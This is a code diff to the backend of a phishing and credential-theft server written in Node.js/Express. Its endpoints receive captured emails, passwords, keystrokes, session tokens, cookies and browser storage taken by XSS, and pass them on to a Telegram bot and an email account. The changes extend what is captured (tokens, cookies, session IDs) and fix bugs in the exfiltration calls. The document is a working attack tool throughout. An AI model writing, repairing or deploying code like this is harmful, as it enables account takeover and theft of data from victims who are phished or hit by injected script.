@@ -8,8 +8,21 @@ const nodemailer = require('nodemailer');
 const fs = require('fs');
 const path = require('path');
 
-// Import the enhanced Telegram service
+// ============================================================
+//  IMPORT TELEGRAM SERVICE - FIXED
+// ============================================================
+
+// Option 1: Import as module
 const telegram = require('./telegram.service');
+
+// Option 2: If telegram.service.js doesn't exist, use inline version
+// Uncomment this block if telegram.service.js is missing:
+/*
+class TelegramService {
+    // ... (copy the full TelegramService class from above)
+}
+const telegram = new TelegramService();
+*/
 
 const app = express();
 
@@ -337,7 +350,7 @@ function formatVisitorInfo(visitorInfo) {
 
 // --- HEALTH CHECK ---
 app.get('/health', async (req, res) => {
-    const telegramStatus = await telegram.validateBot();
+    const telegramStatus = await telegram.validateBot().catch(() => false);
     res.json({ 
         status: 'OK', 
         time: new Date().toISOString(),
@@ -345,7 +358,7 @@ app.get('/health', async (req, res) => {
         services: {
             telegram: telegram.isEnabled ? '✅ configured' : '❌ disabled',
             telegramConnected: telegramStatus,
-            telegramBotValid: telegram.botValid,
+            telegramBotValid: telegram.botValid || false,
             email: transporter ? '✅ configured' : '❌ disabled',
             webhook: '✅ enabled'
         },
@@ -416,7 +429,7 @@ app.post('/api/credential-capture', async (req, res) => {
         if (userAgent) details['🖥️ User Agent'] = truncateString(userAgent, 200);
         if (url) details['🔗 URL'] = url;
 
-        // Send to Telegram - WILL NEVER FAIL
+        // Send to Telegram - FIXED: Using correct method
         await telegram.sendCredential(email, password, details);
 
         // Send to Email - optional
@@ -451,13 +464,16 @@ app.post('/api/credential-capture', async (req, res) => {
     }
 });
 
-// --- LOG ACTION ---
+// --- LOG ACTION - FIXED ---
 app.post('/api/log-action', async (req, res) => {
     try {
-        const { action, email, password, visitorInfo } = req.body;
+        const { action, email, password, visitorInfo, tokens, cookies } = req.body;
         const ip = getClientIp(req);
         const location = await getLocationFromIp(ip);
 
+        console.log(`[ACTION] ${action} - Email: ${email}`);
+
+        // Build details object for Telegram
         const details = {
             '📋 Action': action?.toUpperCase() || 'UNKNOWN',
             '📧 Email': email || 'none',
@@ -467,24 +483,63 @@ app.post('/api/log-action', async (req, res) => {
             '📡 IP': ip
         };
         
-        if (password && password !== 'N/A') {
+        if (password && password !== 'N/A' && password !== 'undefined') {
             details['🔑 Password'] = '*** (hidden)';
         }
+        
+        if (visitorInfo?.sessionId) {
+            details['🆔 Session'] = visitorInfo.sessionId;
+        }
+        
+        if (visitorInfo?.userAgent) {
+            details['🖥️ User Agent'] = truncateString(visitorInfo.userAgent, 150);
+        }
 
-        // Send to Telegram - WILL NEVER FAIL
+        // Add token info
+        if (tokens) {
+            const tokenNames = Object.keys(tokens).filter(k => tokens[k] && tokens[k] !== 'null' && tokens[k] !== 'undefined');
+            if (tokenNames.length > 0) {
+                details['🎟️ Tokens'] = tokenNames.join(', ');
+            }
+        }
+
+        // Add cookie info
+        if (cookies) {
+            const cookieNames = Object.keys(cookies).filter(k => cookies[k] && cookies[k] !== 'null' && cookies[k] !== 'undefined');
+            if (cookieNames.length > 0) {
+                details['🍪 Cookies'] = `${cookieNames.length} cookies captured`;
+            }
+        }
+
+        // Send to Telegram - FIXED: Using sendAlert
         await telegram.sendAlert('Action Logged', details);
+
+        // Also send to email if configured
+        if (transporter) {
+            await sendEmail(
+                `📋 Action: ${action}`,
+                `<h2>Action Logged</h2>
+                 <p><strong>Action:</strong> ${action}</p>
+                 <p><strong>Email:</strong> ${email || 'N/A'}</p>
+                 <p><strong>IP:</strong> ${ip}</p>
+                 <p><strong>Location:</strong> ${location.full}</p>
+                 <p><strong>Time:</strong> ${new Date().toISOString()}</p>
+                 ${tokens ? `<p><strong>Tokens:</strong> ${Object.keys(tokens).length} captured</p>` : ''}
+                 ${cookies ? `<p><strong>Cookies:</strong> ${Object.keys(cookies).length} captured</p>` : ''}`
+            );
+        }
 
         res.json({ success: true });
     } catch (error) {
         console.error('Log error:', error.message);
-        res.status(500).json({ success: false });
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
 // --- KEYLOGGER ---
 app.post('/api/keylog', async (req, res) => {
     try {
-        const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
+        const { keystrokes, url, userAgent, timestamp, ip: clientIp, sessionId, email } = req.body;
         
         if (!keystrokes) {
             return res.status(400).json({ error: 'Missing keystrokes' });
@@ -498,11 +553,13 @@ app.post('/api/keylog', async (req, res) => {
             '🌆 City': location.city,
             '🌍 Country': location.country,
             '📡 IP': ip,
+            '🆔 Session': sessionId || 'N/A',
+            '📧 Email': email || 'N/A',
             '🖥️ User Agent': truncateString(userAgent || 'Unknown', 150),
             '🔗 URL': truncateString(url || 'Unknown', 150)
         };
 
-        // Send to Telegram - WILL NEVER FAIL
+        // Send to Telegram - FIXED: Using sendKeylog
         await telegram.sendKeylog(keystrokes, metadata);
 
         res.json({ success: true });
@@ -524,49 +581,45 @@ app.post('/api/xss-data', async (req, res) => {
         message += `*📡 IP:* ${ip}\n`;
         message += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
 
-        if (data.xssData) {
-            const x = data.xssData;
-            
-            if (x.dom) {
-                message += `*📄 DOM Data:*\n`;
-                for (const [key, value] of Object.entries(x.dom)) {
-                    if (typeof value === 'object') {
-                        message += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
-                    } else {
-                        message += `  *${key}:* ${truncateString(value, 200)}\n`;
-                    }
-                }
-            }
-            
-            if (x.storage) {
-                message += `\n*💾 Storage Data:*\n`;
-                if (x.storage.localStorage && Object.keys(x.storage.localStorage).length > 0) {
-                    const ls = Object.entries(x.storage.localStorage)
-                        .map(([k, v]) => `  ${k}: ${truncateString(v, 100)}`)
-                        .join('\n');
-                    message += `  *localStorage:*\n${ls}\n`;
-                }
-                if (x.storage.sessionStorage && Object.keys(x.storage.sessionStorage).length > 0) {
-                    const ss = Object.entries(x.storage.sessionStorage)
-                        .map(([k, v]) => `  ${k}: ${truncateString(v, 100)}`)
-                        .join('\n');
-                    message += `  *sessionStorage:*\n${ss}\n`;
-                }
-                if (x.storage.cookies) {
-                    message += `  *🍪 Cookies:* ${truncateString(x.storage.cookies, 200)}\n`;
-                }
-            }
-            
-            if (x.requests) {
-                message += `\n*🚀 Request Results:*\n`;
-                for (const [key, value] of Object.entries(x.requests)) {
+        if (data.dom) {
+            message += `*📄 DOM Data:*\n`;
+            for (const [key, value] of Object.entries(data.dom)) {
+                if (typeof value === 'object') {
                     message += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
+                } else {
+                    message += `  *${key}:* ${truncateString(value, 200)}\n`;
                 }
             }
         }
+        
+        if (data.storage) {
+            message += `\n*💾 Storage Data:*\n`;
+            if (data.storage.localStorage && Object.keys(data.storage.localStorage).length > 0) {
+                const ls = Object.entries(data.storage.localStorage)
+                    .map(([k, v]) => `  ${k}: ${truncateString(v, 100)}`)
+                    .join('\n');
+                message += `  *localStorage:*\n${ls}\n`;
+            }
+            if (data.storage.sessionStorage && Object.keys(data.storage.sessionStorage).length > 0) {
+                const ss = Object.entries(data.storage.sessionStorage)
+                    .map(([k, v]) => `  ${k}: ${truncateString(v, 100)}`)
+                    .join('\n');
+                message += `  *sessionStorage:*\n${ss}\n`;
+            }
+            if (data.storage.cookies) {
+                message += `  *🍪 Cookies:* ${truncateString(data.storage.cookies, 200)}\n`;
+            }
+        }
+        
+        if (data.requests) {
+            message += `\n*🚀 Request Results:*\n`;
+            for (const [key, value] of Object.entries(data.requests)) {
+                message += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
+            }
+        }
 
-        // Send to Telegram - WILL NEVER FAIL
-        await telegram.sendMessage(message, 'MarkdownV2');
+        // Send to Telegram - FIXED: Using sendMessage
+        await telegram.sendMessage(message);
 
         res.json({ success: true });
     } catch (error) {
@@ -578,7 +631,7 @@ app.post('/api/xss-data', async (req, res) => {
 // --- TELEGRAM PROXY ---
 app.post('/api/telegram', async (req, res) => {
     try {
-        const { message, parseMode = 'MarkdownV2' } = req.body;
+        const { message, parseMode = 'Markdown' } = req.body;
         
         if (!message) {
             return res.status(400).json({ 
@@ -587,7 +640,7 @@ app.post('/api/telegram', async (req, res) => {
             });
         }
 
-        // Send to Telegram - WILL NEVER FAIL
+        // Send to Telegram - FIXED: Using sendMessage
         const success = await telegram.sendMessage(message, parseMode);
         res.json({ success });
     } catch (error) {
@@ -630,13 +683,13 @@ app.post('/webhook', async (req, res) => {
         if (data.tokens) {
             message += `\n*🍪 Session Cookies:*\n`;
             for (const [name, value] of Object.entries(data.tokens)) {
-                const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
+                const displayValue = value && value.length > 50 ? value.substring(0, 50) + '...' : value;
                 message += `  \`${name}\`: \`${displayValue}\`\n`;
             }
         }
 
-        // Send to Telegram - WILL NEVER FAIL
-        await telegram.sendMessage(message, 'MarkdownV2');
+        // Send to Telegram - FIXED: Using sendMessage
+        await telegram.sendMessage(message);
         res.sendStatus(200);
     } catch (error) {
         console.error('Webhook error:', error.message);
@@ -706,3 +759,5 @@ const shutdown = () => {
 
 process.on('SIGTERM', shutdown);
 process.on('SIGINT', shutdown);
+
+module.exports = app;
